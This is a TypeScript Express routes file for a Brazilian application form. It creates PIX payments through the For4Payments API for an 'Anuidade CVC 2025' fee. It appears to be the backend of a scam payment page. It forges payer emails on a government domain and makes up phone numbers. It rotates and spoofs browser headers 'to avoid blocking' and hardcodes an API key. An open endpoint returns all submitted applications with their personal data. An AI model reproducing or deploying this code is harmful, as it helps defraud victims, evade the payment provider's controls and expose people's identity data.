import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertApplicationSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Submit application
  app.post("/api/applications", async (req, res) => {
    try {
      const validatedData = insertApplicationSchema.parse(req.body);
      const application = await storage.createApplication(validatedData);
      res.json({ success: true, application });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Dados inválidos", details: error.errors });
      } else {
        res.status(500).json({ error: "Erro interno do servidor" });
      }
    }
  });

  // Get all applications (for admin purposes)
  app.get("/api/applications", async (req, res) => {
    try {
      const applications = await storage.getAllApplications();
      res.json(applications);
    } catch (error) {
      res.status(500).json({ error: "Erro interno do servidor" });
    }
  });

  // Helper functions for For4Payments API
  function generateRandomEmail(name: string): string {
    const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, '');
    const randomNum = Math.floor(1000 + Math.random() * 9000);
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${cleanName}${randomNum}@${domain}`;
  }

  function generateRandomPhone(): string {
    const ddd = Math.floor(11 + Math.random() * 89);
    const number = Math.floor(900000000 + Math.random() * 100000000);
    return `${ddd}${number}`;
  }

  // For4Payments PIX payment creation
  app.post("/api/create-pix-payment", async (req, res) => {
    try {
      const { name, cpf, amount, phone } = req.body;
      
      // Validation
      if (!name || !cpf || !amount) {
        return res.status(400).json({ error: "Campos obrigatórios: name, cpf, amount" });
      }

      // Clean CPF
      const cleanCpf = cpf.replace(/\D/g, '');
      if (cleanCpf.length !== 11) {
        return res.status(400).json({ error: "CPF deve conter 11 dígitos" });
      }

      // Convert amount to cents
      const amountInCents = Math.round(parseFloat(amount) * 100);
      if (amountInCents <= 0) {
        return res.status(400).json({ error: "Valor deve ser maior que zero" });
      }

      // Generate email based on CPF (following the script pattern)
      const email = `${cleanCpf}@participante.encceja.gov.br`;
      
      // Process phone or generate random
      let processedPhone = phone;
      if (!phone || phone.replace(/\D/g, '').length < 10) {
        processedPhone = generateRandomPhone();
      } else {
        processedPhone = phone.replace(/\D/g, '');
        // Remove country code if present
        if (processedPhone.startsWith('55') && processedPhone.length > 11) {
          processedPhone = processedPhone.substring(2);
        }
      }

      // Random headers to avoid blocking
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
      ];

      const languages = [
        "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7"
      ];

      const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const randomLanguage = languages[Math.floor(Math.random() * languages.length)];

      // Payment data
      const paymentData = {
        name: name,
        email: email,
        cpf: cleanCpf,
        phone: processedPhone,
        paymentMethod: "PIX",
        amount: amountInCents,
        items: [{
          title: "Anuidade CVC 2025",
          quantity: 1,
          unitPrice: amountInCents,
          tangible: false
        }]
      };

      // API request headers
      const headers = {
        'Authorization': 'f24aeaca-59a8-4c27-a88a-e31e08fc99af',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': randomUserAgent,
        'Accept-Language': randomLanguage,
        'Cache-Control': 'no-cache',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Cache-Buster': Date.now().toString(),
        'Referer': 'https://cvc-agentes.replit.app/anuidade',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty'
      };

      console.log(`Creating PIX payment for ${name} (CPF: ${cleanCpf.substring(0, 3)}...${cleanCpf.substring(9)})`);
      console.log(`Amount: R$ ${(amountInCents / 100).toFixed(2)} (${amountInCents} cents)`);

      // Make request to For4Payments API
      const response = await fetch('https://app.for4payments.com.br/api/v1/transaction.purchase', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(paymentData)
      });

      console.log(`For4Payments API response status: ${response.status}`);

      if (response.ok) {
        const responseData = await response.json();
        console.log('For4Payments API response:', responseData);

        // Extract PIX code and QR code from multiple possible fields
        const pixCode = 
          responseData.pixCode ||
          responseData.copy_paste ||
          responseData.code ||
          responseData.pix_code ||
          responseData.pix?.code ||
          responseData.pix?.copy_paste;

        const pixQrCode = 
          responseData.pixQrCode ||
          responseData.qr_code_image ||
          responseData.qr_code ||
          responseData.pix_qr_code ||
          responseData.pix?.qrCode ||
          responseData.pix?.qr_code_image;

        const result = {
          id: responseData.id || responseData.transactionId,
          pixCode: pixCode,
          pixQrCode: pixQrCode,
          expiresAt: responseData.expiresAt || responseData.expiration,
          status: responseData.status || 'pending'
        };

        console.log('Payment created successfully:', result.id);
        res.json(result);
      } else {
        const errorText = await response.text();
        console.error('For4Payments API error:', response.status, errorText);
        
        if (response.status === 401) {
          res.status(401).json({ error: "Falha na autenticação com a API For4Payments" });
        } else {
          res.status(response.status).json({ 
            error: `Erro ao processar pagamento (Status: ${response.status})` 
          });
        }
      }
    } catch (error) {
      console.error('PIX payment creation error:', error);
      res.status(500).json({ error: "Erro interno ao processar pagamento" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}